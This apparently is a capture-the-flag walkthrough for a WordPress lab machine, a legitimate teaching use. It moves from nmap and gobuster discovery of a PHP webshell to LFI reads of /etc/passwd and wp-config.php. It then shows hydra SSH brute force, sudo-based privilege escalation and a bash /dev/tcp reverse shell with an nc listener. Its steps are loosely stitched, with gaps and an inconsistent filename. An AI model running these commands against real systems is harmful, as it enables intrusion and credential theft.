# Capture the Flag Walkthrough - Detailed Initial Steps

## Network Setup & Reasoning

### Machine Configuration
1. **Attacker Machine (Kali)**
   - Two network adapters:
     - Host-only adapter (target machine communication)
     - NAT adapter (internet access for tools/packages)

2. **Target Machine**
   - Single network adapter (host-only)

### Why Host-Only Networking?
- **Key Advantage**: Automatic DHCP distribution
- **Contrast**: Internal Networks don't inherently handle DHCP
- **Practical Benefit**: No need for initial target box access to configure networking

## Target Discovery & Port Scanning

### Finding Your IP
```bash
hostname -I
```
**Important Note**: You'll likely see two IPs:
- Public IP (NAT interface)
- Private IP (Host-only interface)
- **Use the private IP for this challenge**

### Initial Network Scan
```bash
sudo nmap -v --min-rate 10000 $targetIP/24 | grep open
```
**Note**: Replace $targetIP with your host IP from step 1

### Detailed Port Scan
```bash
sudo nmap -v -sV -sC -oN nmap $targetIP
```
**Parameter Breakdown**:
- `-v`: Verbose output for detailed information
- `-sV`: Service versioning (e.g., identifies Apache 2.4.41 instead of just "port 80 open")
- `-sC`: Script scan (runs default scripts to identify common vulnerabilities)
- `-oN`: Output Normal format (creates readable reference file)

**Scan Results**:
- Port 80: Apache HTTP
- Port 22: OpenSSH
- Initial focus: Web service (SSH offers limited initial attack surface)

## Web Application Analysis

### Initial Frontend Investigation
1. Navigate to `http://$targetIP`
2. **Key Observation**: Plain HTML display suggests either:
   - Non-existent/inexperienced frontend developer
   - CSS resolution issues

### Source Code Analysis
1. **WordPress Indicators**:
   - Explicit comment: "Proudly powered by WordPress"
   - DNS prefetch: `//s.w.org` (WordPress's static resource CDN)

### Troubleshooting CSS Issues (To verify we're not resolving correctly to redrocks.win)
1. **Using Browser Dev Tools (F12)**:
   - Check Network tab
   - Look for failed CSS file requests
   - Note domain: `redrocks.win`

2. **DNS Resolution Fix**:
   ```bash
   # Add to /etc/hosts:
   $targetIP    redrocks.win
   ```

## Discovering the Backdoor

### Initial Clues
1. **"Hello Blue" Link Analysis**:
   - Source code reveals "Looking For It?" (oddly capitalized)
   - Suggests potential Local File Inclusion (LFI) vulnerability

2. **Key References in Code**:
   - Mr. Miessler → Author of Seclists (security assessment collections)
   - Mention of inability to read → Hints at LFI backdoor
   - Environment: Apache PHP (WordPress standard)

### Install Seclists (only necessary if not present on system)
```bash
sudo apt install seclists
```

### Backdoor Hunt Using Gobuster
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt \
    -x .php -u http://redrocks.win/ -o dir80.txt -z
```

**Result Found**:
```
/NetworkFileManagerPHP.php (Status: 500) [Size: 0]
```

### Result Analysis
- Google search for "NetworkFileManagerPHP.php" reveals:
  - GitHub results mentioning webshells
  - Direct reference in seclists
  - Likely being used as LFI backdoor (confirmed by earlier hint)

In this stage, we'll delve into the web application running on the target machine. Our goal is to uncover a hidden backdoor that will allow us to gain access.

### Identifying the Backdoor

1.  **Google Search:** We start by searching for the identified file, `NetworkFileManagerPHP.php`, on Google. This search leads us to a GitHub repository containing various web shells, including the one we're interested in.

2.  **Web Shell Basics:** A web shell is a malicious script that grants remote access and control over a web server. It's often used by attackers to execute commands, upload files, and manipulate the server environment.

3.  **LFI Hint:** Based on the provided hint, we suspect that this web shell is being used in conjunction with a Local File Inclusion (LFI) vulnerability. LFI allows an attacker to trick the web application into including local files from the server, potentially leading to unauthorized access or code execution.

### Testing for LFI

1.  **WFUZZ:** To test our LFI theory, we utilize a tool called `wfuzz`. This tool helps us send a series of requests to the web application, fuzzing different parameters to identify potential vulnerabilities.

2.  **Fuzzing Results:** After running `wfuzz`, we discover a parameter named "key" that seems promising. This parameter might be vulnerable to LFI.

3.  **LFI Attempt:** To confirm our suspicion, we craft a request that includes a known file path (`/etc/passwd`) through the "key" parameter. This file typically contains user information on Linux systems.

4.  **Successful LFI:** If our LFI attempt is successful, the web application will respond with the contents of the `/etc/passwd` file, confirming the vulnerability and giving us valuable information about the system's users.




## Exploiting the LFI Vulnerability

Now that we've confirmed the Local File Inclusion (LFI) vulnerability, let's explore how we can leverage it to gain further access to the target system.

### Extracting System Information

1.  **Targeting /etc/passwd:**  We can use the identified LFI vulnerability to read the contents of the `/etc/passwd` file. This file stores essential information about user accounts on the system, including usernames, user IDs, and their corresponding shells.

2.  **Analyzing /etc/passwd Output:** The output reveals a list of users present on the system, including `root`, `daemon`, `bin`, and others. Each line represents a user and provides details like their home directory and default shell.

### Identifying WordPress Configuration

1.  **WordPress Focus:** Since the target website appears to be running WordPress, we shift our attention to potential WordPress-related vulnerabilities.

2.  **wp-config.php:** A crucial file in WordPress installations is `wp-config.php`. This file stores sensitive information, including database credentials. We aim to access this file using the LFI vulnerability.

3.  **Tools for Analysis:** Tools like Burp Suite, a web proxy, and PHP wrappers can be instrumental in analyzing the vulnerable code and potentially accessing the `wp-config.php` file.

4.  **Examining NetworkFileManager.php:** We'll examine the `NetworkFileManager.php` file, which likely contains the vulnerable code responsible for the LFI. Understanding this code can help us craft precise requests to access sensitive files like `wp-config.php`.


### Initial Access
```bash
hydra -l john -P passlist.txt 192.168.56.102 ssh
sshpass -p 'CURRENT_PASSWORD' ssh john@192.168.56.102
```

### Privilege Escalation Setup
```bash
sudo -u ippsec /usr/bin/time /bin/bash
cd /dev/shm/
```

### Creating Reverse Shell
1. **Create shell script:**
```bash
echo '#!/bin/bash
bash -c '\''bash -i >& /dev/tcp/192.168.56.101/9001 0>&1'\''' > shell.sh
chmod +x shell.sh
```

2. **Set up listener (on attacking machine):**
```bash
nc -lvnp 9001
```

3. **Execute shell (on target machine):**
```bash
./shell.sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Terminal Stabilization
```bash
# Press ctrl+z
stty raw -echo;fg
# Press ENTER twice
export TERM=xterm
```

## Advanced Privilege Escalation with pspy

### On Attacking Machine
```bash
# Download pspy (using v1.2.0 due to GLIBC compatibility)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

# Start temporary HTTP server
python3 -m http.server 80
```

### On Target Machine
```bash
wget [TARGETMACHINE IP]/pspy64s
chmod +x pspy64s
./pspy64s
```

## Important Notes
- Always ensure you have proper authorization before performing penetration testing
- These commands should be used responsibly and ethically
- Some steps may need to be adjusted based on specific target configurations
- Always verify commands before execution to prevent unintended consequences

[Additional steps to be documented based on specific CTF requirements]
